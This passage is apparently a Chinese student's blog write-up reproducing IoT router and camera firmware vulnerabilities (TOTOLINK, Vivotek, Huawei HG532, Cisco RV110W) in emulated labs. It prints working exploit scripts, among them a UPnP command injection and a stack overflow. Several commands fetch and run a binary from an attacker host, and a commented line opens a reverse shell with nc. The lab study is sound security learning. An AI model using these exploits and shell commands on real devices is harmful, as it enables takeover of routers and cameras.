<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    Iot-vulhub复现 丨
    

    tw11ty&#39;s Blog
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

</head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">tw11ty</a>
    <ul class="nav">
      
      <li><a href="/archives">归档</a></li>
      
      <li><a href="/about">关于</a></li>
      
      <li><a href="/group">友链</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">Iot-vulhub复现</div>
  <div class="post-meta">
    <div class="date">2024 June 25th</div>
    <div class="tags">
      
      <div class="tag-item">IOT</div>
      
    </div>
  </div>
  

  <main class="post-content"><p>借着逆向课的作业，就借此机会来简单学习并复现iot固件漏洞。网上搜集资料找到了<a target="_blank" rel="noopener" href="https://github.com/Vu1nT0tal/IoT-vulhub">Vu1nT0tal&#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.com)</a>，感觉该项目对0基础入门iot固件漏洞复现是蛮有帮助的，就以此对相关漏洞进行复现。</p>
<p>由于我的服务器是国内的，所以构建过程会有很多麻烦，而且dockerhub也g了……</p>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>- <a href="#env">环境构建</a></p>
<ul>
<li><a href="#env_basic">基础环境构建</a></li>
<li><a href="#env_vul">漏洞环境构建</a></li>
</ul>
<p>- <a href="#TOTOLINK">TOTOLINK NR1800X (CVE-2022-41518)</a></p>
<p>- <a href="#VIVOTEK">Vivotek CC8160 栈溢出漏洞</a></p>
<p>- <a href="#HG532">华为 HG532 远程代码执行漏洞（CVE-2017-17215）</a></p>
<p>- <a href="#CISCO">Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）</a></p>
<p>- <a href="#DLINK">D-Link DIR-859 命令注入漏洞（未成功）（CVE-2019-17621）</a></p>
<h1 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建 "></a>环境构建 <a id="env"></a></h1><p><a target="_blank" rel="noopener" href="https://wsxk.github.io/IotVulhub/">IoT-vulhub 漏洞复现 – wsxk’s blog – 小菜鸡</a></p>
<p><a target="_blank" rel="noopener" href="https://brvc3.github.io/2023/03/15/IoT-Vulhub%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">IoT-Vulhub基础环境搭建 | Brvc3’s Base</a></p>
<p>docker拉取问题解决：<a target="_blank" rel="noopener" href="https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file">https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file</a></p>
<h2 id="基础环境构建"><a href="#基础环境构建" class="headerlink" title="基础环境构建"></a>基础环境构建<a id="env_basic"></a></h2><p> 构建 ubuntu1604 基础镜像</p>
<blockquote>
<p>cd baseImage&#x2F;ubuntu1604 &amp;&amp; docker build -t firmianay&#x2F;ubuntu1604 .</p>
</blockquote>
<p> 构建 binwalk 容器</p>
<blockquote>
<p>cd baseImage&#x2F;binwalk &amp;&amp; docker build -t firmianay&#x2F;binwalk .</p>
</blockquote>
<h2 id="漏洞环境构建"><a href="#漏洞环境构建" class="headerlink" title="漏洞环境构建"></a>漏洞环境构建<a id="env_vul"></a></h2><p>初始化环境（arm&#x2F;mips&#x2F;mipsel）</p>
<blockquote>
<p>.&#x2F;init_env.sh xxxx</p>
</blockquote>
<p>自动化编译环境，看有什么docker-compose就知道支持什么了</p>
<blockquote>
<p>docker-compose -f docker-compose-user.yml build         # QEMU 用户模式模拟</p>
<p>docker-compose -f docker-compose-system.yml build       # QEMU 系统模式模拟</p>
<p>docker-compose -f docker-compose-firmadyne.yml build    # firmadyne 模拟</p>
<p>docker-compose -f docker-compose-firmae.yml build       # firmae 模拟（方便调试）</p>
</blockquote>
<p>启动环境</p>
<blockquote>
<p>docker-compose -f docker-compose-xxxx.yml up</p>
</blockquote>
<p>删除环境</p>
<blockquote>
<p>docker-compose -f docker-compose-xxxx.yml down -v</p>
</blockquote>
<h1 id="TOTOLINK-NR1800X-CVE-2022-41518"><a href="#TOTOLINK-NR1800X-CVE-2022-41518" class="headerlink" title="TOTOLINK NR1800X (CVE-2022-41518)"></a>TOTOLINK NR1800X (CVE-2022-41518)<a id="TOTOLINK"></a></h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1995/">TOTOLINK NR1800X 系列 CVE 分析 (seebug.org)</a></p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
<li>docker：攻击、调试主机：192.168.2.1</li>
<li>qemu-system：固件主机：192.168.2.2</li>
<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mipsel</code></li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压提取固件：</p>
<blockquote>
<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;TOTOLINK_NR1800X_B20210910_ALL.bin”</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903763.png" alt="image-20240623135537006"></p>
<p>查看文件相关信息  32位 小端序 mips架构</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903687.png" alt="image-20240623135819202"></p>
<p>1.构建、启动漏洞环境：</p>
<pre><code class="highlight plaintext">./init_env.sh mipsel
docker-compose -f docker-compose-system.yml build</code></pre>

<p>a.缺少firmianay&#x2F;qemu-system:mipsel，自行本地构建，去到对应的文件夹IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel创建镜像</p>
<pre><code class="highlight plaintext">docker build -t firmianay/qemu-system:mipsel .</code></pre>

<p>b.构建时COPY命令出错，由于高版本docker会对文件名检测，需要修改Dockerfile</p>
<pre><code class="highlight Dockerfile">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"> ./firmware/_*/squashfs-root /root/squashfs-root</span>
ERROR: Service <span class="string">&#x27;system-emu&#x27;</span> failed to build: When using <span class="keyword">COPY</span><span class="language-bash"> with more than one <span class="built_in">source</span> file, the destination must be a directory and end with a /</span></code></pre>

<p>c.将firmware下子文件夹内的squashfs-root提取到firmware里，修改Dockerfile的步骤为  COPY .&#x2F;firmware&#x2F;squashfs-root &#x2F;root&#x2F;squashfs-root</p>
<pre><code class="highlight plaintext">cp -r ./_TOTOLINK_NR1800X_B20210910_ALL.bin.extracted/squashfs-root/ ./</code></pre>

<p>2.启动容器</p>
<pre><code class="highlight plaintext">docker-compose -f docker-compose-system.yml up</code></pre>

<p>d.运行爆错TOTO-system   | &#x2F;bin&#x2F;sh: 1: .&#x2F;run.sh: Permission denied，服务没起起来</p>
<blockquote>
<p>Dockerfile中添加  RUN chmod +x &#x2F;bin&#x2F;run.sh</p>
</blockquote>
<p>e.重新构建启动，会爆缺少debian_wheezy_mipsel_standard.qcow2文件，这是在我们qwmu-system构建时(a步骤)中进行构建，我们需要本地下载下来，重新走一遍12步骤</p>
<blockquote>
<p>修改&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel&#x2F;images&#x2F;download.sh，原链接改为<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a></p>
</blockquote>
<pre><code class="highlight plaintext">vim ./download.sh
#!/bin/bash

# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta

./download.sh</code></pre>

<p>服务启动成功！</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902277.png" alt="image-20240623143052731"></p>
<p>3.开启ssh隧道</p>
<p>本地使用ssh创建socks代理，然后浏览器配置代理</p>
<pre><code class="highlight plaintext">ssh -D 10007 root@124.221.122.67 -p 1234</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903524.png" alt="image-20240623153609456"></p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903795.png" alt="image-20240623152246628"></p>
<p>成功访问服务路由</p>
<p>运行exp.py，打通</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903991.png" alt="image-20240623153513904"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>CVE-2022-41525的成因是cstecgi.cgi的doSystem过滤不严谨，将cstecgi.cgi 传下来进行分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902852.png" alt="image-20240623153858761"></p>
<p>通过dosystem交叉调用寻找漏洞点，</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251904405.png" alt="image-20240623154248447"></p>
<p>ida不支持mips的反汇编，需要下载Retdec插件，但是有点大了，所以我使用ghidra进行反编译</p>
<p>&#x2F;cgi-bin&#x2F;cstecgi.cgi 的 UploadFirmwareFile 函数，其参数FileName参数可控，并且将作为doSystem的参数被执行。</p>
<p>这个命令注入不需要进行绕过。</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902945.png" alt="image-20240623164123142"></p>
<h1 id="Vivotek-CC8160-栈溢出漏洞"><a href="#Vivotek-CC8160-栈溢出漏洞" class="headerlink" title="Vivotek CC8160 栈溢出漏洞"></a>Vivotek CC8160 栈溢出漏洞<a id="VIVOTEK"></a></h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5054?time__1311=n4+xnD07iti=j2DBqooGkYd0QeG=Q8DRjoD&alichlgref=https://xz.aliyun.com/t/5054#toc-4">Vivotek远程栈溢出漏洞分析与复现 - 先知社区 (aliyun.com)</a></p>
<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
<li>docker：攻击、调试主机：192.168.2.1</li>
<li>qemu-system：固件主机：192.168.2.2</li>
<li>httpd（有漏洞服务）：192.168.2.2:80</li>
<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:armel</code></li>
</ul>
<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在漏洞路径下  使用 firmianay&#x2F;binwalk 解压固件</p>
<blockquote>
<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;DIR822A1_FW103WWb03.bin”</p>
</blockquote>
<h3 id="用户模拟"><a href="#用户模拟" class="headerlink" title="用户模拟"></a>用户模拟</h3><p>构建并启动漏洞环境:</p>
<blockquote>
<p>docker-compose -f docker-compose-user.yml build</p>
</blockquote>
<p>这里构建环境出现问题缺少firmianay&#x2F;qemu-user-static 镜像文件，docker.io中没有对应的镜像文件，我们需要到~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-static里面自行构建</p>
<blockquote>
<p>cd ~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-static</p>
<p>docker build -t firmianay&#x2F;qemu-user-static.</p>
</blockquote>
<p>然后就能成功在本地构建镜像</p>
<p>重新构建启动容器，能够成功运行服务</p>
<blockquote>
<p>docker-compose -f docker-compose-user.yml build</p>
<p>docker-compose -f docker-compose-user.yml up</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251859341.png" alt="image-20240625185942262"></p>
<h3 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h3><p>先自行构建qemu-system镜像</p>
<pre><code class="highlight shell">cd ~/iot_hub/IoT-vulhub-master/baseImage/qemu-system/armel/images
./download.sh   #记得改链接
<span class="meta prompt_"></span>
<span class="meta prompt_">#</span><span class="language-bash">镜像构建</span>
docker build -t firmianay/qemu-system:$&#123;ARCH&#125; .
</code></pre>

<p>如果构建qemu-system时gef拉取不下来就注释掉</p>
<p> 然后跟着手册走</p>
<p>输入poc发现系统服务dump了</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251900140.png" alt="image-20240622212015099"></p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>固件解包后查看漏洞文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251923337.png" alt="image-20240625192328286"></p>
<p>漏洞分析：</p>
<p>漏洞点位于&#x2F;usr&#x2F;sbin&#x2F;httpd中的sub_17F80，由于Content-Length引起的溢出</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251953973.png" alt="image-20240625195352919"></p>
<p>uVar6是 “Content-Length” 的初始地址</p>
<p>而iVar3 、4是在字符串中“\n”和“:”首次出现的地址，二者之间也就是输入的消息</p>
<p>通过strncpy来将iVar4 + 1 (Content-Length_value)的 iVar3 - (iVar4 + 1) 字节(Content-Length_len)数据copy到 &amp;local_38</p>
<p>程序没有对Content-length字段进行校验，直接将输入的消息赋值给了local_38中，而local_38距离栈底只有0x38字节</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406252002547.png" alt="image-20240625200208487"></p>
<p>poc</p>
<pre><code class="highlight python"><span class="comment">#!usr/bin/python</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">import</span> requests

header = &#123;
	<span class="string">&quot;Content-Length&quot;</span>:<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;</span>
&#125;

url = <span class="string">&quot;http://192.168.2.2&quot;</span> + <span class="string">&quot;/cgi-bin/admin/upgrade.cgi&quot;</span>


session = requests.session()
session.post(url, headers=header)</code></pre>







<h1 id="华为-HG532-远程代码执行漏洞（CVE-2017-17215）"><a href="#华为-HG532-远程代码执行漏洞（CVE-2017-17215）" class="headerlink" title="华为 HG532 远程代码执行漏洞（CVE-2017-17215）"></a>华为 HG532 远程代码执行漏洞（CVE-2017-17215）<a id="HG532"></a></h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0g4n-blog/p/15613816.html">漏洞分析：CVE-2017-17215 - Riv4ille - 博客园 (cnblogs.com)</a></p>
<h2 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
<li>docker：攻击、调试主机：192.168.2.1</li>
<li>qemu-system：固件主机：192.168.2.2</li>
<li>uhttpd（有漏洞 Web 服务器）：192.168.2.2:80</li>
<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mips</code></li>
</ul>
<h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压固件</p>
<blockquote>
<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;HG532eV100R001C01B020_upgrade_packet.bin”</p>
</blockquote>
<p>固件分析 32位 mips架构 小端序</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261004016.png" alt="image-20240626100451970"></p>
<p>剩下步骤与TOTOLINK NR1800X相同，本地构建qemu-system镜像，然后构建漏洞环境，启动环境</p>
<blockquote>
<p>#到squashfs-root所在目录</p>
<p>cp -r .&#x2F;squashfs-root&#x2F; ..&#x2F;</p>
<p>#改Dockerfile文件目录</p>
<p>#构建本地qemu-system镜像</p>
<p>docker build -t firmianay&#x2F;qemu-system:mips .</p>
<p>docker-compose -f docker-compose-system.yml build</p>
<p>docker-compose -f docker-compose-system.yml up</p>
</blockquote>
<p>使用ssh设置socks 代理后，配置浏览器代理，然后登陆 Web 后台 <a target="_blank" rel="noopener" href="http://192.168.2.2/%EF%BC%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8A%A5%E9%94%99">http://192.168.2.2/，服务端报错</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260004775.png" alt="image-20240625234908598"></p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260909274.png" alt="image-20240626090924119"></p>
<p>本地代理连接测试，成功连接到了192.168.2.2并且重定向到<a target="_blank" rel="noopener" href="https://192.168.2.2/">https://192.168.2.2</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260912255.png" alt="image-20240626091219207"></p>
<p>测试https连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260914069.png" alt="image-20240626091406016"></p>
<p>发现是接收到了SSL证书错误，添加-k选项，忽略SSL证书验证</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260916879.png" alt="image-20240626091654813"></p>
<p>成功访问服务！</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261029907.png" alt="image-20240626094931147"></p>
<p>照着文档打通了<img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260045636.png" alt="image-20240626004523543"></p>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>详细的控制流分析以及UPnP协议的学习有些心有余而力不足了</p>
<p>简单分析一下upnp里面的关键漏洞代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261030685.png" alt="image-20240626101528081"></p>
<p>这里调用了snprintf(a0, a1, a2, a3)</p>
<p>即snprintf(a0, 0x400, “upg -g -U %s -t ‘1 Firmware Upgrade Ima”, a3)</p>
<p>a0源操作数，a1为size，a2为格式化字符，a3为指定格式化的数据</p>
<p>a0又是snprintf的源操作数，也是system调用的参数，最后会执行system(a0)</p>
<p>exp:最终执行cmd</p>
<pre><code class="highlight python"><span class="comment">#!/usr/bin/python3</span>

<span class="keyword">import</span> requests
<span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">from</span> threading <span class="keyword">import</span> Thread

<span class="comment"># cmd = &quot;busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 7777 -e /bin/sh&quot;</span>
cmd  = <span class="string">&#x27;wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf\n&#x27;</span>
cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>
cmd += <span class="string">&#x27;/msf&#x27;</span>

<span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)

data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n    &lt;s:Envelope xmlns:s=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; s:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;\n    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\&quot;urn:schemas-upnp-org:service:WANPPPConnection:1\&quot;&gt;\n    &lt;NewStatusURL&gt;$(&quot;</span> + cmd + <span class="string">&quot;)&lt;/NewStatusURL&gt;\n&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\n&lt;/u:Upgrade&gt;\n    &lt;/s:Body&gt;\n    &lt;/s:Envelope&gt;&quot;</span>
url = <span class="string">&quot;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&quot;</span>

<span class="keyword">def</span> <span class="title function_">attack</span>():
    <span class="keyword">try</span>:
        requests.post(url, auth=HTTPDigestAuth(<span class="string">&#x27;dslf-config&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>), data=data)
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        <span class="built_in">print</span>(e)

thread = Thread(target=attack)
thread.start()

io = listen(<span class="number">31337</span>)
io.wait_for_connection()
log.success(<span class="string">&quot;getshell&quot;</span>)
io.interactive()

thread.join()</code></pre>



<h1 id="Cisco-RV110W-远程代码执行漏洞（CVE-2020-3331）"><a href="#Cisco-RV110W-远程代码执行漏洞（CVE-2020-3331）" class="headerlink" title="Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）"></a>Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）<a id="CISCO"></a></h1><p>难题的复现找来找去只有那么几位师傅</p>
<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-271900.htm">原创]Cisco RV110W 远程代码执行漏洞分析(CVE-2020-3331)-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p>思科无线路由器</p>
<h2 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
<li>docker：攻击、调试主机：192.168.2.1</li>
<li>qemu-system：固件主机：192.168.2.2</li>
<li>httpd（有漏洞 Web 服务器）：192.168.2.2:80</li>
<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mipsel</code></li>
</ul>
<h2 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压固件</p>
<blockquote>
<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;RV110W_FW_1.2.2.5.bin”</p>
</blockquote>
<p>构建启动环境</p>
<blockquote>
<p>.&#x2F;init_env.sh mipsel</p>
<p>docker-compose -f docker-compose-system.yml build</p>
<p>docker-compose -f docker-compose-system.yml up</p>
</blockquote>
<p>docker内进行端口转发(Docker-compose.yml中写好了端口映射)</p>
<blockquote>
<p>ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#46;&#49;">&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#46;&#49;</a> -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666</p>
<p>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;">&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;</a> -f -N -g -R 0.0.0.0:80:192.168.2.2:80</p>
</blockquote>
<p>nmap可以扫到服务  8888–漏洞服务    6666–gdbserver</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262320963.png" alt="image-20240626231935303"></p>
<p>运行exp，打通</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262355451.png" alt="image-20240626235453453"></p>
<p>断开后服务会down，需要重新up才能起来</p>
<p>调试配置</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271159313.png" alt="image-20240627115953109"></p>
<h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>内置的gef插件无法正常加载–原因为gdb与python版本较低</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270002901.png" alt="image-20240627000252848"></p>
<p>官方手册</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270004520.png" alt="image-20240627000444482"></p>
<p>要求GDB 8.0以上，Python3.6+，修改更麻烦了，干脆不装gef了，把gef哪行注释掉</p>
<pre><code class="highlight Dockerfile"><span class="keyword">FROM</span> firmianay/ubuntu1604                                                                                                                
<span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;firmianay@gmail.com&quot;</span>                                                                                                       </span>
                                                                                                                                         
<span class="keyword">WORKDIR</span><span class="language-bash"> /root                                                                                                                            </span>
                                                                                                                                         
<span class="keyword">RUN</span><span class="language-bash"> apt-get update \                                                                                                                     </span>
    &amp;&amp; apt-get install -y qemu-system-mipsel \                                                                                           
    &amp;&amp; apt-get install -y --no-install-recommends bridge-utils uml-utilities expect gdb-multiarch git python3-dev openssh-server netcat curl libssl-dev libffi-dev build-essential tcpdump \                                                                                      
    &amp;&amp; sed -i <span class="string">&quot;s/PermitRootLogin prohibit-password/PermitRootLogin yes/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; echo <span class="string">&quot;root:root&quot;</span> | chpasswd &amp;&amp; echo <span class="string">&quot;GatewayPorts yes&quot;</span> &gt;&gt;  /etc/ssh/sshd_config \                                                                                               
   <span class="comment"># &amp;&amp; git clone --depth=1 https://github.com/hugsy/gef.git \   </span>
    &amp;&amp; git clone --depth=<span class="number">1</span> https://github.com/longld/peda.git ~/peda \
   <span class="comment"># &amp;&amp; cp gef/gef.py ~/.gef.py &amp;&amp; echo &quot;source ~/.gef.py&quot; &gt; ~/.gdbinit &amp;&amp; echo &quot;export LC_CTYPE=C.UTF-8&quot; &gt;&gt; ~/.bashrc \    </span>
    &amp;&amp; echo <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit &amp;&amp; echo <span class="string">&quot;export LC_CTYPE=C.UTF-8&quot;</span> &gt;&gt; ~/.bashrc \ 
    &amp;&amp; python3 -m pip install --upgrade pwntools \                                                                                       
    &amp;&amp; apt-get purge -y --autoremove git \                                                                                               
    &amp;&amp; rm -rf /var/lib/apt/lists/* /root/gef                                                                                             
                                                                                                                                         
<span class="comment">#RUN mkdir images &amp;&amp; cd images \                                                                                                         </span>
<span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2                                          </span>
<span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta                                                    </span>
                                                                                                                                         
<span class="keyword">COPY</span><span class="language-bash"> ./images /root/images</span></code></pre>



<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本漏洞存在于CISCO RV110W-E-CN-K9（固件版本1.2.2.5），漏洞原因是cgi接口guest_logout.cgi中存在栈溢出漏洞，而因为mips本身不支持NX从而导致可以使用shellcode得到shell </p>
<p>漏洞点 sscanf函数通过政策表达式将v11输入v29和v28中  其中v29存储的是分号前的所有字符，而v28存储的是不在分号后和等号前但在等号后换行符前的所有字符</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271205845.png" alt="image-20240627120518766"></p>
<p>然后跟踪v11</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271207669.png" alt="image-20240627120718622"></p>
<p>exp:</p>
<p>msf生成的exp</p>
<pre><code class="highlight python"><span class="comment">#!/usr/bin/python3</span>

<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">import</span> requests
<span class="keyword">from</span> threading <span class="keyword">import</span> Thread

context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)

system = <span class="number">0x0047A610</span>

cmd  = <span class="string">&#x27;\n&#x27;</span>
cmd += <span class="string">&#x27;wget http://192.168.2.1:8000/tools/msf -O /msf\n&#x27;</span>
cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>
cmd += <span class="string">&#x27;/msf\n&#x27;</span>

<span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">0x55</span>)

payload = <span class="string">b&quot;status_guestnet.asp&quot;</span> + cmd.ljust(<span class="number">0x55</span>,<span class="string">&#x27;a&#x27;</span>).encode() + p32(system) 
data = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>, <span class="string">&quot;submit_button&quot;</span>:payload, <span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.100.1&quot;</span>&#125;

<span class="keyword">def</span> <span class="title function_">attack</span>():
